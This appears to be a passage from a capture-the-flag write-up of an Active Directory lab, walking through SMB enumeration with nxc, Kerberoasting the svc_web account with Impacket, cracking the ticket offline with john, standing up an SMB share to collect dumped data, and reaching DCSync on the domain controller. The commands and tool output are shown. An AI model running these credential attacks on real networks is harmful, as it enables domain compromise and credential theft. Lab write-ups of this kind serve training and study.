...
# DISCLAIMER  
The initial scenario was assumed breach, but to counter any form of cheater it was modified slighty while also attempting to have it remain realistic, there were was also a rabbit  
hole that was added making `hasan.bakri` vulnerable to asreproasting. 
  
## Original Assumed breach  
...
the following IP addresses are in scope (the second octet may be different):  
...
using these credentials, we can first fingerprint the domain.  
...
we can test this across the domain with the following command and additionally, obtain the hostnames  
  
```shell  
nxc smb targets.txt -u 'hasan.bakri' -p 'hasan.bakri' --generate-hosts-file hosts.txtSMB         10.2.10.11      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:albalad.bsides.rv) (signing:True) (SMBv1:False)  
...
```shell  
GetUserSPNs.py 'albalad.bsides.rv'/'hasan.bakri':'hasan.bakri' -request-user 'svc_web' -outputfile 'svc_web.tgs'Impacket v0.13.0.dev0+20250422.104055.27bebb13 - Copyright Fortra, LLC and its affiliated companies   
ServicePrincipalName                Name     MemberOf                                                 PasswordLastSet             LastLogon  Delegation ----------------------------------  -------  -------------------------------------------------------  --------------------------  ---------  ----------HTTP/W-SVR-02.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>               HTTP/W-SVR-01.albalad.bsides.rv:80  svc_web  CN=Service Accounts,CN=Users,DC=albalad,DC=bsides,DC=rv  2025-04-28 12:50:15.334591  <never>  
```  
  
this ticket can be cracked offline with `john`, or `hashcat`.  
  
```shell  
john --wordlist=/usr/share/wordlists/rockyou.txt svc_web.tgs Using default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuswebkinz1         (?)     1g 0:00:00:00 DONE (2025-04-28 13:01) 33.33g/s 1126Kp/s 1126Kc/s 1126KC/s dumbo..redcatUse the "--show" option to display all of the cracked passwords reliablySession completed.
```  
...
To minimize our footprint we are going to take   
  
  
  
```shell  
smbserver.py sawyer . -smb2supportImpacket 
v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies   
[*] Config file parsed  
...
so now we can dump everything locally  
...
Using the DC account we should be able to DCSync the DC!, as we can see we are actually able to!  
